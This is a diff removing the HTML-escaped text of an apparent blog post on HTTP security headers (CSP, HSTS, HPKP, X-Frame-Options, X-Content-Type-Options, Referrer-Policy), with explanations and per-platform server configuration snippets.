-&lt;td&gt;&lt;code&gt;add_header X-XSS-Protection &amp;quot;1; mode=block&amp;quot;;&lt;/code&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;Apache&lt;/td&gt;
-&lt;td&gt;&lt;code&gt;Header always set X-XSS-Protection &amp;quot;1; mode=block&amp;quot;&lt;/code&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;Varnish&lt;/td&gt;
-&lt;td&gt;&lt;code&gt;set resp.http.X-XSS-Protection = &amp;quot;1; mode=block&amp;quot;;&lt;/code&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;/tbody&gt;&lt;/table&gt;
-
-&lt;h3 id="x-xss-protection/more"&gt;I want to know more&lt;/h3&gt;
-
-&lt;p&gt;&lt;a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-XSS-Protection"&gt;X-XSS-Protection - MDN&lt;/a&gt;&lt;/p&gt;
-
-&lt;hr&gt;
-
-&lt;h2 id="csp"&gt;Content Security Policy&lt;/h2&gt;
-&lt;pre class="highlight plaintext"&gt;&lt;code&gt;Content-Security-Policy: &amp;lt;policy&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id="csp/why"&gt;Why?&lt;/h3&gt;
-
-&lt;p&gt;Content Security Policy can be thought of as much more advanced version of the
-&lt;code&gt;X-XSS-Protection&lt;/code&gt; header above. While &lt;code&gt;X-XSS-Protection&lt;/code&gt; will block scripts
-that come from the request, it&amp;rsquo;s not going to stop an XSS attack that involves
-storing a malicious script on your server or loading an external resource with a
-malicious script in it.&lt;/p&gt;
-
-&lt;p&gt;CSP gives you a language to define where the browser can load resources from.
-You can white list origins for scripts, images, fonts, stylesheets, etc in a very
-granular manner. You can also compare any loaded content against a hash or
-signature.&lt;/p&gt;
-
-&lt;h3 id="csp/should"&gt;Should I use it?&lt;/h3&gt;
-
-&lt;p&gt;Yes. It won&amp;rsquo;t prevent all XSS attacks, but it&amp;rsquo;s a significant mitigation against
-their impact, and an important aspect of defense-in-depth. That said, it can be
-hard to implement. If you&amp;rsquo;re an intrepid reader and went ahead and checked the
-headers &lt;a href="https://appcanary.com"&gt;appcanary.com&lt;/a&gt; returns&lt;sup id="fnref2"&gt;&lt;a href="#fn2" rel="footnote"&gt;2&lt;/a&gt;&lt;/sup&gt;, you&amp;rsquo;ll see that we don&amp;rsquo;t
-have CSP implemented yet. There are some rails development plugins we&amp;rsquo;re using
-that are holding us back from a CSP implementation that will have an actually security impact.
-We&amp;rsquo;re working on it, and will write about it in the next instalment!&lt;/p&gt;
-
-&lt;h3 id="csp/how"&gt;How?&lt;/h3&gt;
-
-&lt;p&gt;Writing a CSP policy can be challenging.
-See
-&lt;a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy"&gt;here&lt;/a&gt; for
-a list of all the directives you can employ. A good place to start
-is &lt;a href="https://csp.withgoogle.com/docs/adopting-csp.html"&gt;here&lt;/a&gt;.&lt;/p&gt;
-
-&lt;table&gt;&lt;thead&gt;
-&lt;tr&gt;
-&lt;th&gt;Platform&lt;/th&gt;
-&lt;th&gt;What do I do?&lt;/th&gt;
-&lt;/tr&gt;
-&lt;/thead&gt;&lt;tbody&gt;
-&lt;tr&gt;
-&lt;td&gt;Rails 4 and 5&lt;/td&gt;
-&lt;td&gt;Use &lt;a href="https://github.com/twitter/secureheaders"&gt;secureheaders&lt;/a&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;Django&lt;/td&gt;
-&lt;td&gt;Use &lt;a href="https://github.com/mozilla/django-csp"&gt;django-csp&lt;/a&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;Express.js&lt;/td&gt;
-&lt;td&gt;Use &lt;a href="https://github.com/helmetjs/csp"&gt;helmet/csp&lt;/a&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;Go&lt;/td&gt;
-&lt;td&gt;Use &lt;a href="https://github.com/unrolled/secure"&gt;unrolled/secure&lt;/a&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;Nginx&lt;/td&gt;
-&lt;td&gt;&lt;code&gt;add_header Content-Security-Policy &amp;quot;&amp;lt;policy&amp;gt;&amp;quot;;&lt;/code&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;Apache&lt;/td&gt;
-&lt;td&gt;&lt;code&gt;Header always set Content-Security-Policy &amp;quot;&amp;lt;policy&amp;gt;&amp;quot;&lt;/code&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;Varnish&lt;/td&gt;
-&lt;td&gt;&lt;code&gt;set resp.http.Content-Security-Policy = &amp;quot;&amp;lt;policy&amp;gt;&amp;quot;;&lt;/code&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;/tbody&gt;&lt;/table&gt;
-
-&lt;h3 id="csp/more"&gt;I want to know more&lt;/h3&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy"&gt;Content-Security-Policy - MDN&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="https://content-security-policy.com/"&gt;CSP Quick Reference Guide&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="https://csp.withgoogle.com/docs/index.html"&gt;Google&amp;rsquo;s CSP Guide&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;hr&gt;
-
-&lt;h2 id="hsts"&gt;HTTP Strict Transport Security (HSTS)&lt;/h2&gt;
-&lt;pre class="highlight plaintext"&gt;&lt;code&gt;Strict-Transport-Security: max-age=&amp;lt;expire-time&amp;gt;
-Strict-Transport-Security: max-age=&amp;lt;expire-time&amp;gt;; includeSubDomains
-Strict-Transport-Security: max-age=&amp;lt;expire-time&amp;gt;; preload
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id="hsts/why"&gt;Why?&lt;/h3&gt;
-
-&lt;p&gt;When we want to securely communicate with someone, we face two problems. The
-first problem is privacy; we want to make sure the messages we send can only
-be read by the recipient, and no one else. The other problem is that of
-authentication: how do we know the recipient is who they say they are?&lt;/p&gt;
-
-&lt;p&gt;HTTPS solves the first problem with encryption, though it has some major issues
-with authentication (more on this later, see &lt;a href="#http-public-key-pinning-hpkp"&gt;Public Key
-Pinning&lt;/a&gt;). The HSTS header solves the
-meta-problem: how do you know if the person you&amp;rsquo;re talking to actually supports
-encryption?&lt;/p&gt;
-
-&lt;p&gt;HSTS mitigates an attack called
-&lt;a href="https://moxie.org/software/sslstrip/"&gt;sslstrip&lt;/a&gt;. Suppose you&amp;rsquo;re using a hostile
-network, where a malicious attacker controls the wifi router. The attacker can
-disable encryption between you and the websites you&amp;rsquo;re browsing. Even if the
-site you&amp;rsquo;re accessing is only available over HTTPS, the attacker can
-man-in-the-middle the HTTP traffic and make it look like the site works over
-unencrypted HTTP. No need for SSL certs, just disable the encryption.&lt;/p&gt;
-
-&lt;p&gt;Enter the HSTS. The &lt;code&gt;Strict-Transport-Security&lt;/code&gt; header solves this by letting
-your browser know that it must always use encryption with your site. As long as
-your browser has seen an HSTS header &amp;mdash; and it hasn&amp;rsquo;t expired &amp;mdash; it
-will not access the site unencrypted, and will error out if it&amp;rsquo;s not available
-over HTTPS.&lt;/p&gt;
-
-&lt;h3 id="hsts/should"&gt;Should I use it? &lt;/h3&gt;
-
-&lt;p&gt;Yes. Your app is only available over HTTPS, right? Trying to browse over regular
-old HTTP will redirect to the secure site, right? (Hint: Use
-&lt;a href="https://letsencrypt.org/"&gt;letsencrypt&lt;/a&gt; if you want to avoid the racket that are
-commercial certificate authorities.)&lt;/p&gt;
-
-&lt;p&gt;The one downside of the HSTS header is that it allows for a &lt;a href="http://www.radicalresearch.co.uk/lab/hstssupercookies"&gt;clever
-technique&lt;/a&gt; to create
-supercookies that can fingerprint your users. As a website operator, you
-probably already track your users somewhat - but try to only use HSTS for good
-and not for supercookies.&lt;/p&gt;
-
-&lt;h3 id="hsts/how"&gt;How?&lt;/h3&gt;
-
-&lt;p&gt;The two options are&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;code&gt;includeSubDomains&lt;/code&gt; - HSTS applies to subdomains&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;preload&lt;/code&gt; - Google maintains a &lt;a href="https://hstspreload.appspot.com/"&gt;service&lt;/a&gt;
-that hardcodes&lt;sup id="fnref3"&gt;&lt;a href="#fn3" rel="footnote"&gt;3&lt;/a&gt;&lt;/sup&gt; your site as being HTTPS only into browsers. This
-way, a user doesn&amp;rsquo;t even have to visit your site: their browser already knows
-it should reject unencrypted connections.
-Getting off that list is hard, by the way, so only turn it on if you know you
-can support HTTPS forever on all your subdomains.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;table&gt;&lt;thead&gt;
-&lt;tr&gt;
-&lt;th&gt;Platform&lt;/th&gt;
-&lt;th&gt;What do I do?&lt;/th&gt;
-&lt;/tr&gt;
-&lt;/thead&gt;&lt;tbody&gt;
-&lt;tr&gt;
-&lt;td&gt;Rails 4&lt;/td&gt;
-&lt;td&gt;&lt;code&gt;config.force_ssl = true&lt;/code&gt;&lt;br/&gt;Does not include subdomains by default. To set it:&lt;br/&gt;&lt;code&gt;config.ssl_options = { hsts: { subdomains: true } }&lt;/code&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;Rails 5&lt;/td&gt;
-&lt;td&gt;&lt;code&gt;config.force_ssl = true&lt;/code&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;Django&lt;/td&gt;
-&lt;td&gt;&lt;code&gt;SECURE_HSTS_SECONDS = 31536000&lt;/code&gt; &lt;br/&gt; &lt;code&gt;SECURE_HSTS_INCLUDE_SUBDOMAINS = True&lt;/code&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;Express.js&lt;/td&gt;
-&lt;td&gt;Use &lt;a href="https://helmetjs.github.io/docs/hsts/"&gt;helmet&lt;/a&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;Go&lt;/td&gt;
-&lt;td&gt;Use &lt;a href="https://github.com/unrolled/secure"&gt;unrolled/secure&lt;/a&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;Nginx&lt;/td&gt;
-&lt;td&gt;&lt;code&gt;add_header Strict-Transport-Security &amp;quot;max-age=31536000; includeSubdomains; &amp;quot;;&lt;/code&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;Apache&lt;/td&gt;
-&lt;td&gt;&lt;code&gt;Header always set Strict-Transport-Security &amp;quot;max-age=31536000; includeSubdomains;&lt;/code&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;Varnish&lt;/td&gt;
-&lt;td&gt;&lt;code&gt;set resp.http.Strict-Transport-Security = &amp;quot;max-age=31536000; includeSubdomains; &amp;quot;;&lt;/code&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;/tbody&gt;&lt;/table&gt;
-
-&lt;h3 id="hsts/more"&gt;I want to know more&lt;/h3&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;a href="https://tools.ietf.org/html/rfc6797"&gt;RFC 6797&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security"&gt;Strict-Transport-Security - MDN&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;hr&gt;
-
-&lt;h2 id="hpkp"&gt;HTTP Public Key Pinning (HPKP)&lt;/h2&gt;
-&lt;pre class="highlight plaintext"&gt;&lt;code&gt;Public-Key-Pins: pin-sha256=&amp;lt;base64==&amp;gt;; max-age=&amp;lt;expireTime&amp;gt;;
-Public-Key-Pins: pin-sha256=&amp;lt;base64==&amp;gt;; max-age=&amp;lt;expireTime&amp;gt;; includeSubDomains
-Public-Key-Pins: pin-sha256=&amp;lt;base64==&amp;gt;; max-age=&amp;lt;expireTime&amp;gt;; report-uri=&amp;lt;reportURI&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id="hpkp/why"&gt;Why?&lt;/h3&gt;
-
-&lt;p&gt;The HSTS header described above was designed to ensure that all connections to your
-website are encrypted. However, nowhere does it specify what key to use! &lt;/p&gt;
-
-&lt;p&gt;Trust on the
-web is based on the certificate authority (CA) model. Your browser and operating system
-ship with the public keys of some trusted certificate authorities which are
-usually specialized companies and/or nation states. When a CA issues you a
-certificate for a given domain that means anyone who trusts that CA will
-automatically trust the SSL traffic you encrypt using that certificate.  The CAs
-are responsible for verifying that you actually own a domain (this can be
-anything from sending an email, to asking you to host a file, to investigating
-your company).&lt;/p&gt;
-
-&lt;p&gt;Two CAs can issue a certificate for the same domain to two different people, and
-browsers will trust both. This creates a problem, especially since CAs &lt;a href="https://technet.microsoft.com/library/security/2524375"&gt;can be
-and are&lt;/a&gt; compromised.
-This allows attackers to MiTM any domain they want, even if that domain uses SSL
-&amp;amp; HSTS!&lt;/p&gt;
-
-&lt;p&gt;The HPKP header tries to mitigate this. This header lets you to &amp;ldquo;pin&amp;rdquo; a
-certificate. When a browser sees the header for the first time, it will save the
-certificate. For every request up to &lt;code&gt;max-age&lt;/code&gt;, the browser will fail unless at
-least one certificate in the chain sent from the server has a fingerprint that
-was pinned.&lt;/p&gt;
-
-&lt;p&gt;This means that you can pin to the CA or a intermediate certificate along with
-the leaf in order to not shoot yourself in the foot (more on this later).&lt;/p&gt;
-
-&lt;p&gt;Much like HSTS above, the HPKP header also has some privacy implications.
-These were laid out in the &lt;a href="https://tools.ietf.org/html/rfc7469#section-5"&gt;RFC&lt;/a&gt;
-itself.&lt;/p&gt;
-
-&lt;h3 id="hpkp/should"&gt;Should I use it? &lt;/h3&gt;
-
-&lt;p&gt;Probably not. &lt;/p&gt;
-
-&lt;p&gt;HPKP is a very very sharp knife. Consider this: if you pin to the wrong
-certificate, or you lose your keys, or something else goes wrong, you&amp;rsquo;ve locked
-your users out of your site. All you can do is wait for the pin to expire.&lt;/p&gt;
-
-&lt;p&gt;This
-&lt;a href="https://blog.qualys.com/ssllabs/2016/09/06/is-http-public-key-pinning-dead"&gt;article&lt;/a&gt;
-lays out the case against it, and includes a fun way for attackers to use HPKP
-to hold their victims ransom.&lt;/p&gt;
-
-&lt;p&gt;One alternative is using the &lt;code&gt;Public-Key-Pins-Report-Only&lt;/code&gt; header, which will
-just report that something went wrong, but not lock anyone out. This allows you
-to at least know your users are being MiTMed with fake certificates.&lt;/p&gt;
-
-&lt;h3 id="hpkp/how"&gt;How?&lt;/h3&gt;
-
-&lt;p&gt;The two options are&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;code&gt;includeSubDomains&lt;/code&gt; - HPKP applies to subdomains&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;report-uri&lt;/code&gt; - Inavlid attempts will be reported here&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;You have to generate a base64 encoded fingerprint for the key you pin to, and
-you &lt;strong&gt;have&lt;/strong&gt; to use a backup key.  Check &lt;a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Public_Key_Pinning#Extracting_the_Base64_encoded_public_key_information"&gt;this
-guide&lt;/a&gt;
-for how to do it.&lt;/p&gt;
-
-&lt;table&gt;&lt;thead&gt;
-&lt;tr&gt;
-&lt;th&gt;Platform&lt;/th&gt;
-&lt;th&gt;What do I do?&lt;/th&gt;
-&lt;/tr&gt;
-&lt;/thead&gt;&lt;tbody&gt;
-&lt;tr&gt;
-&lt;td&gt;Rails 4 and 5&lt;/td&gt;
-&lt;td&gt;Use &lt;a href="https://github.com/twitter/secureheaders/blob/master/docs/HPKP.md"&gt;secureheaders&lt;/a&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;Django&lt;/td&gt;
-&lt;td&gt;Write custom middleware&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;Express.js&lt;/td&gt;
-&lt;td&gt;Use &lt;a href="https://helmetjs.github.io/docs/hpkp/"&gt;helmet&lt;/a&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;Go&lt;/td&gt;
-&lt;td&gt;Use &lt;a href="https://github.com/unrolled/secure"&gt;unrolled/secure&lt;/a&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;Nginx&lt;/td&gt;
-&lt;td&gt;&lt;code&gt;add_header Public-Key-Pins &amp;#39;pin-sha256=&amp;quot;&amp;lt;primary&amp;gt;&amp;quot;; pin-sha256=&amp;quot;&amp;lt;backup&amp;gt;&amp;quot;; max-age=5184000; includeSubDomains&amp;#39;;&lt;/code&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;Apache&lt;/td&gt;
-&lt;td&gt;&lt;code&gt;Header always set Public-Key-Pins &amp;#39;pin-sha256=&amp;quot;&amp;lt;primary&amp;gt;&amp;quot;; pin-sha256=&amp;quot;&amp;lt;backup&amp;gt;&amp;quot;; max-age=5184000; includeSubDomains&amp;#39;;&lt;/code&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;Varnish&lt;/td&gt;
-&lt;td&gt;&lt;code&gt;set resp.http.Public-Key-Pins = &amp;quot;pin-sha256=&amp;quot;&amp;lt;primary&amp;gt;&amp;quot;; pin-sha256=&amp;quot;&amp;lt;backup&amp;gt;&amp;quot;; max-age=5184000; includeSubDomains&amp;quot;;&lt;/code&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;/tbody&gt;&lt;/table&gt;
-
-&lt;h3 id="hpkp/more"&gt;I want to know more&lt;/h3&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;a href="https://tools.ietf.org/html/rfc7469"&gt;RFC 7469&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Public_Key_Pinning"&gt;HTTP Public Key Pinning (HPKP) - MDN&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;hr&gt;
-
-&lt;h2 id="x-frame-options"&gt;X-Frame-Options&lt;/h2&gt;
-&lt;pre class="highlight plaintext"&gt;&lt;code&gt;X-Frame-Options: DENY
-X-Frame-Options: SAMEORIGIN
-X-Frame-Options: ALLOW-FROM https://example.com/
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id="x-frame-options/why"&gt;Why?&lt;/h3&gt;
-
-&lt;p&gt;Before we started giving dumb names to vulnerabilities, we used to give dumb
-names to hacking techniques. &amp;ldquo;Clickjacking&amp;rdquo; is one of those dumb names. &lt;/p&gt;
-
-&lt;p&gt;The idea goes like this: you create an invisible iframe, place it in focus and
-route user input into it. As an attacker, you can then trick people into playing
-a browser-based game while their clicks are being registered by a hidden iframe
-displaying twitter - forcing them to non-consensually retweet all of your
-tweets.&lt;/p&gt;
-
-&lt;p&gt;It sounds dumb, but it&amp;rsquo;s an effective attack.&lt;/p&gt;
-
-&lt;h3 id="x-frame-options/should"&gt;Should I use it?&lt;/h3&gt;
-
-&lt;p&gt;Yes. Your app is a beautiful snowflake. Do you really want some
-&lt;a href="https://techcrunch.com/2015/04/08/annotate-this/"&gt;genius&lt;/a&gt; shoving it into an
-iframe so they can vandalize it?&lt;/p&gt;
-
-&lt;h3 id="x-frame-options/how"&gt;How?&lt;/h3&gt;
-
-&lt;p&gt;&lt;code&gt;X-Frame-Options&lt;/code&gt; has three modes, which are pretty self explanatory.&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;code&gt;DENY&lt;/code&gt; - No one can put this page in an iframe&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;SAMEORIGIN&lt;/code&gt; - The page can only be displayed in an iframe by someone on the same origin.&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;ALLOW-FROM&lt;/code&gt; - Specify a specific url that can put the page in an iframe&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;One thing to remember is that you can stack iframes as deep as you want, and in
-that case, the behavior of &lt;code&gt;SAMEORIGIN&lt;/code&gt; and &lt;code&gt;ALLOW-FROM&lt;/code&gt; isn&amp;rsquo;t
-&lt;a href="https://tools.ietf.org/html/rfc7034#section-2.3.2.2"&gt;specified&lt;/a&gt;. That is, if we
-have a triple-decker iframe sandwich and the innermost iframe has &lt;code&gt;SAMEORIGIN&lt;/code&gt;,
-do we care about the origin of the iframe around it, or the topmost one on the
-page? ¯\_(ツ)_/¯.&lt;/p&gt;
-
-&lt;table&gt;&lt;thead&gt;
-&lt;tr&gt;
-&lt;th&gt;Platform&lt;/th&gt;
-&lt;th&gt;What do I do?&lt;/th&gt;
-&lt;/tr&gt;
-&lt;/thead&gt;&lt;tbody&gt;
-&lt;tr&gt;
-&lt;td&gt;Rails 4 and 5&lt;/td&gt;
-&lt;td&gt;&lt;code&gt;SAMEORIGIN&lt;/code&gt; is set by default.&lt;br/&gt;&lt;br/&gt;To set &lt;code&gt;DENY&lt;/code&gt;:&lt;br/&gt;&lt;code&gt;config.action_dispatch.default_headers[&amp;#39;X-Frame-Options&amp;#39;] = &amp;quot;DENY&amp;quot;&lt;/code&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;Django&lt;/td&gt;
-&lt;td&gt;&lt;code&gt;MIDDLEWARE = [ ... &amp;#39;django.middleware.clickjacking.XFrameOptionsMiddleware&amp;#39;, ... ]&lt;/code&gt;&lt;br/&gt; This defaults to &lt;code&gt;SAMEORIGIN&lt;/code&gt;.&lt;br/&gt;&lt;br/&gt;To set &lt;code&gt;DENY&lt;/code&gt;: &lt;code&gt;X_FRAME_OPTIONS = &amp;#39;DENY&amp;#39;&lt;/code&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;Express.js&lt;/td&gt;
-&lt;td&gt;Use &lt;a href="https://helmetjs.github.io/docs/frameguard/"&gt;helmet&lt;/a&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;Go&lt;/td&gt;
-&lt;td&gt;Use &lt;a href="https://github.com/unrolled/secure"&gt;unrolled/secure&lt;/a&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;Nginx&lt;/td&gt;
-&lt;td&gt;&lt;code&gt;add_header X-Frame-Options &amp;quot;deny&amp;quot;;&lt;/code&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;Apache&lt;/td&gt;
-&lt;td&gt;&lt;code&gt;Header always set X-Frame-Options &amp;quot;deny&amp;quot;&lt;/code&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;Varnish&lt;/td&gt;
-&lt;td&gt;&lt;code&gt;set resp.http.X-Frame-Options = &amp;quot;deny&amp;quot;;&lt;/code&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;/tbody&gt;&lt;/table&gt;
-
-&lt;h3 id="x-frame-options/more"&gt;I want to know more&lt;/h3&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;a href="https://tools.ietf.org/html/rfc7034"&gt;RFC 7034&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options"&gt;X-Frame-Options - MDN&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;hr&gt;
-
-&lt;h2 id="x-content-type-options"&gt;X-Content-Type-Options&lt;/h2&gt;
-&lt;pre class="highlight plaintext"&gt;&lt;code&gt;X-Content-Type-Options: nosniff;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id="x-content-type-options/why"&gt;Why?&lt;/h3&gt;
-
-&lt;p&gt;The problem this header solves is called &amp;ldquo;MIME sniffing&amp;rdquo;, which is actually a
-browser &amp;ldquo;feature&amp;rdquo;. &lt;/p&gt;
-
-&lt;p&gt;In theory, every time your server responds to a request it is supposed to set a
-&lt;code&gt;Content-Type&lt;/code&gt; header in order to tell the browser if it&amp;rsquo;s getting some HTML, a
-cat gif, or a Flash cartoon from 2008. Unfortunately, the web has always been
-broken and has never really followed a spec for anything; back in the day lots
-of people didn&amp;rsquo;t bother to set the content type header properly. &lt;/p&gt;
-
-&lt;p&gt;As a result, browser vendors decided they should be really helpful and try to
-infer the content type by inspecting the content itself while completely ignore
-the content type header.  If it looks like a gif, display a gif!, even though
-the content type is &lt;code&gt;text/html&lt;/code&gt;.  Likewise, if it looks like we got some HTML,
-we should render it as such even if the server said it&amp;rsquo;s a gif.&lt;/p&gt;
-
-&lt;p&gt;This is great, except when you&amp;rsquo;re running a photo-sharing site, and users can
-upload photos that look like HTML with javascript included, and suddenly you
-have a stored XSS attack on your hand.&lt;/p&gt;
-
-&lt;p&gt;The &lt;code&gt;X-Content-Type-Options&lt;/code&gt; headers exist to tell the browser to shut up and
-set the damn content type to what I tell you, thank you.&lt;/p&gt;
-
-&lt;h3 id="x-content-type-options/should"&gt;Should I use it?&lt;/h3&gt;
-
-&lt;p&gt;Yes, just make sure to set your content types correctly.&lt;/p&gt;
-
-&lt;h3 id="x-content-type-options/how"&gt;How?&lt;/h3&gt;
-
-&lt;table&gt;&lt;thead&gt;
-&lt;tr&gt;
-&lt;th&gt;Platform&lt;/th&gt;
-&lt;th&gt;What do I do?&lt;/th&gt;
-&lt;/tr&gt;
-&lt;/thead&gt;&lt;tbody&gt;
-&lt;tr&gt;
-&lt;td&gt;Rails 4 and 5&lt;/td&gt;
-&lt;td&gt;On by default&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;Django&lt;/td&gt;
-&lt;td&gt;&lt;code&gt;SECURE_CONTENT_TYPE_NOSNIFF = True&lt;/code&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;Express.js&lt;/td&gt;
-&lt;td&gt;Use &lt;a href="https://helmetjs.github.io/docs/dont-sniff-mimetype/"&gt;helmet&lt;/a&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;Go&lt;/td&gt;
-&lt;td&gt;Use &lt;a href="https://github.com/unrolled/secure"&gt;unrolled/secure&lt;/a&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;Nginx&lt;/td&gt;
-&lt;td&gt;&lt;code&gt;add_header X-Content-Type-Options nosniff;&lt;/code&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;Apache&lt;/td&gt;
-&lt;td&gt;&lt;code&gt;Header always set X-Content-Type-Options nosniff&lt;/code&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;Varnish&lt;/td&gt;
-&lt;td&gt;&lt;code&gt;set resp.http.X-Content-Type-Options = &amp;quot;nosniff&amp;quot;;&lt;/code&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;/tbody&gt;&lt;/table&gt;
-
-&lt;h3 id="x-content-type-options/more"&gt;I want to know more&lt;/h3&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options"&gt;X-Content-Type-Options - MDN&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;hr&gt;
-
-&lt;h2 id="referrer-policy"&gt;Referrer-Policy&lt;/h2&gt;
-&lt;pre class="highlight plaintext"&gt;&lt;code&gt;Referrer-Policy: "no-referrer" 
-Referrer-Policy: "no-referrer-when-downgrade" 
-Referrer-Policy: "origin" 
-Referrer-Policy: "origin-when-cross-origin"
-Referrer-Policy: "same-origin" 
-Referrer-Policy: "strict-origin" 
-Referrer-Policy: "strict-origin-when-cross-origin" 
-Referrer-Policy: "unsafe-url"
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id="referrer-policy/why"&gt;Why?&lt;/h3&gt;
-
-&lt;p&gt;Ah, the &lt;code&gt;Referer&lt;/code&gt; header. Great for analytics, bad for your users&amp;rsquo; privacy. At
-some point the web got woke and decided that maybe it wasn&amp;rsquo;t a good idea to send
-it all the time. And while we&amp;rsquo;re at it, let&amp;rsquo;s spell &amp;ldquo;Referrer&amp;rdquo;
-correctly&lt;sup id="fnref4"&gt;&lt;a href="#fn4" rel="footnote"&gt;4&lt;/a&gt;&lt;/sup&gt;.&lt;/p&gt;
-
-&lt;p&gt;The &lt;code&gt;Referrer-Policy&lt;/code&gt; header allows you to specify when the browser will set a
-&lt;code&gt;Referer&lt;/code&gt; header.&lt;/p&gt;
-
-&lt;h3 id="referrer-policy/should"&gt;Should I use it? &lt;/h3&gt;
-
-&lt;p&gt;It&amp;rsquo;s up to you, but it&amp;rsquo;s probably a good idea. If you don&amp;rsquo;t care about your
-users&amp;rsquo; privacy, think of it as a way to keep your sweet sweet analytics to
-yourself and out of your competitors&amp;rsquo; grubby hands.&lt;/p&gt;
-
